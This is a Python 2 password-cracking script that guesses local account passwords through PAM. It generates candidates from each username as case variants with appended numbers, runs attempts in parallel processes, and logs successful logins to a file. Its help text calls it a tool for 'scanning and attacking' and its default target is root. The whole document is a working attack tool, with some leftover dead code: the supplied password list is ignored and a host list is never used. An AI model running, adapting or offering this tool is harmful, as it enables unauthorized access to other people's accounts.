#!/usr/bin/env python

from socket import *
import multiprocessing
import threading
import time
import paramiko
import sys
import os
import logging
import argparse
import random
import hashlib
import pam

# defines the command line parameter and help page
def argspage():
	parser = argparse.ArgumentParser(
	usage='\n\n   ./%(prog)s -u <arg> | -l <arg> | -t <arg>',
	formatter_class=argparse.RawDescriptionHelpFormatter,
	epilog='examples:\n\nscanning and attacking\nusage: ./%(prog)s -u user -L password.txt -t 10\n\n',
	add_help=False
	)

	options = parser.add_argument_group('options', '')
	options.add_argument('-t', default=4, metavar='<num>',help='threads per host (default: 4)')
	options.add_argument('-u', default='root', metavar='<username>',help='single username (default: root)')
	options.add_argument('-U', default=False, metavar='<file>',help='list of usernames')
	options.add_argument('-l', default='toor', metavar='<password>',help='single password (default: toor)')
	options.add_argument('-L', default=False, metavar='<file>',help='list of passwords')
	options.add_argument('-o', default=False, metavar='<file>',help='write found logins to file')
	options.add_argument('-T', default=3, metavar='<sec>',help='timeout in seconds (default: 3)')

	args = parser.parse_args()

	return args

# checks if given filename by parameter exists
def file_exists(filename):
	try:
		open(filename).readlines()
	except IOError:
		print '[-] ERROR: cannot open file \'%s\'' % filename
		exit(1)

# checks if we can write to file which was given by parameter -o
def test_file(filename):
	try:
		outfile = open(filename, 'a')
		outfile.close()
	except:
		print '[-] ERROR: Cannot write to file \'%s\'' % filename
		exit(1)

# write all found logins to file - parameter -o
def write_logins(filename, login):
    outfile = open(filename, 'a')
    outfile.write(login)
    outfile.close()

# connect to target and try to login
def crack(user, passw, outfile):
	#passMd5 = hashlib.md5(passw).hexdigest()[8:-8]
	p = pam.pam()
	if p.authenticate(user, passw):
		login = '%s[%s] | PASS | ' % (user, passw)
	else:
		login = '%s[%s] | FAILED | %s' % (user, passw,p.reason)
	print login
	if outfile:
		write_logins(outfile, login + '\n')

def convertPassword(userName):
	passList = [userName,userName.upper(),userName.lower(),userName[0].upper() + userName[1:]]
	for strPass in (userName,userName.upper(),userName.lower(),userName[0].upper() + userName[1:]):
		for num in range(0,9999):
			passList.append(strPass + str(num))
			passList.append(strPass + "." + str(num))
			if num < 1000:
				passList.append(strPass + str(num).zfill(4))
				passList.append(strPass + "." + str(num).zfill(4))
	return passList

def multiprocess(args):
	user = args.u
	userlist = args.U
	password = args.l
	passlist = args.L
	outfile = args.o
	to = float(args.T)
	threads = int(args.t)

	if userlist:
		user = open(userlist).readlines()
	else:
		user = [ user ]
	if passlist:
		password = open(passlist).readlines()
	else:
		password = [ password ]

	# looks dirty but we need it :/
	try:
		for us in user:
			us = us.replace('\n', '')
			i = 1
			myPassword = []
			myPassword.extend(convertPassword(us))
			for pw in myPassword:
				pw = pw.replace('\n', '')
				print "[*] user:%s password:[%d/%d]" % (us, i, len(myPassword))
				Run = multiprocessing.Process(target=crack,args=(us, pw, outfile))
				#Run = threading.Thread(target=crack, args=(us, pw, outfile))
				Run.start()
				i += 1
				# checks that we have a max number of childs
				while len(multiprocessing.active_children()) >= threads:
					time.sleep(0.001)
				# checks that we a max number of threads
				#while threading.activeCount() > threads:
				#	time.sleep(0.01)
				#time.sleep(0.001)
			del myPassword[:]
		while multiprocessing.active_children():
			time.sleep(0.1)
	except KeyboardInterrupt:
		os._exit(1)

def main():
	args = argspage()

	if args.U:
		file_exists(args.U)
	if args.L:
		file_exists(args.L)
	if args.o:
		test_file(args.o)

	time.sleep(0.1)
	multiprocess(args)

if __name__ == '__main__':
	HOSTLIST = []
	try:
		logging.disable(logging.CRITICAL)
		main()
	except KeyboardInterrupt:
		print '\nbye bye!!!'
		time.sleep(0.2)
		os._exit(1)